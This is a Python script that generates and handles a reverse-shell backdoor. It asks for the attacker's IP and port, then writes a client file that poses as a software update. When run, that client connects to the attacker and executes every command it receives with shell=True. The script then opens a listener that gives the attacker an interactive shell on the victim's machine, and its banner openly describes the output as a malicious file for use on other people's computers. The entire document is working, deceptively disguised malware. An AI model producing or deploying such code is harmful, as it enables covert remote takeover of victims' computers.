import socket
import subprocess
import os
import sys
import time
import colorama
from colorama import Fore
from colorama import Style

colorama.init()

def banner():
        os.system('clear')
        print(Fore.BLUE + '''
         __      __
   _____/ /_____/ /___  ____  _____
  / ___/ __/ __  / __ \/ __ \/ ___/
 (__  ) /_/ /_/ / /_/ / /_/ / /
/____/\__/\__,_/\____/\____/_/
                © Pham Chien''' + Style.RESET_ALL)
        print('''
-----------------------------------
a tool that can be discovered
underground on other people's computers
-----------------------------------
OPTIONS |

LOCAL HOST : is your IP, or the attacker

LOCAL PORT : is PORT random ,you can leave
       it as you like from 1 to 65500 to use as
       PORT for LOCAL HOST

SET FILE NAME : is to create a name
       for your malicious file
       ex : client
-----------------------------------
''' + Style.RESET_ALL)
banner()

LOCAL_HOST = input("LOCAL HOST > ")
print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"set REMOTE HOST => " + Fore.GREEN + f"{LOCAL_HOST}" + Style.RESET_ALL)
LOCAL_PORT = int(input("LOCAL PORT > "))
print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"set REMOTE PORT => " + Fore.GREEN + f"{LOCAL_PORT}" + Style.RESET_ALL)
REMOTE_HOST = str(LOCAL_HOST)
REMOTE_PORT = int(LOCAL_PORT)
SET_FILENAME = input("SET FILE NAME > ")
print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"set FILE NAME => " + Fore.GREEN + f"{SET_FILENAME}.py" + Style.RESET_ALL)

time.sleep(1)
print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"Starting Created File Backdoor : {SET_FILENAME}.py")
time.sleep(1)
CODE_MALWARE = f'''# Client
import socket
import os
import subprocess

REMOTE_HOST = '{REMOTE_HOST}'
REMOTE_PORT = {REMOTE_PORT}

def banner():
        os.system('clear')
        print("""
  _________       __
 /   _____/ _____/  |_ __ ________
 \_____  \_/ __ \   __\  |  \____ \
 /        \  ___/|  | |  |  /  |_> >
/_______  /\___  >__| |____/|   __/
        \/     \/           |__|
""")
banner()

print("[+] Starting Update Progressing...")

def main():
        socks = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
        )
        socks.connect((
                REMOTE_HOST,
                REMOTE_PORT
        ))
        session = True
        while True:
                output = socks.recv(9024)
                if output == b'end':
                        print("[+] Update Failed !!")
                        socks.close()
                        exit()

                else:
                        proc_sess = subprocess.Popen(
                                output,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE
                        )
                        shell = proc_sess.stdout.read() + proc_sess.stdout.read()
                        socks.send(shell)
main()
'''
with open(f'{SET_FILENAME}.py', 'w') as filename:
        filename.write(CODE_MALWARE)

print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"{filename}.py")
print(Fore.YELLOW + "[!] " + Style.RESET_ALL + f"Starting GET socket Handler...")
time.sleep(3)
def main():
        handler_connect = socket.socket(
                socket.AF_INET,
                socket.SOCK_STREAM
        )
        handler_connect.setsockopt(
                socket.SOL_SOCKET,
                socket.SO_REUSEADDR,
                1
        )
        handler_connect.bind((LOCAL_HOST, LOCAL_PORT))
        handler_connect.listen(1)

        print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"Session Started...")
        time.sleep(1)
        print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"Starting Handler On LOCALTIONS HOST : {LOCAL_HOST}")
        time.sleep(1)
        print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"is starting to listen to the victim connect...")

        info_connect, info_address = handler_connect.accept()

        print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"detected a new connection => {info_address}")
        time.sleep(1)
        print(Fore.GREEN + "[+] " + Style.RESET_ALL + f"{info_connect}")
        time.sleep(1)
        print(Fore.YELLOW + "[!] " + Style.RESET_ALL + "Terminal Shell update in progress")
        time.sleep(3)

        sessions = True
        print(Fore.GREEN + "[+] " + Style.RESET_ALL + "Update successful..." + Style.RESET_ALL)

        while True:
                sys.stdout.write(f"\nshell@{info_address}~$ ")
                shell_cmd = sys.stdin.readline()

                if shell_cmd == "end\n":
                        print(Fore.YELLOW + "[!] " + Style.RESET_ALL + "sessions close")
                        info_connect.send(b'end')
                        info_connect.close()
                        break

                elif shell_cmd != "\n":
                        info_connect.send(shell_cmd.encode())
                        output_shell = info_connect.recv(10024)
                        print('\n' + output_shell.decode())
main()
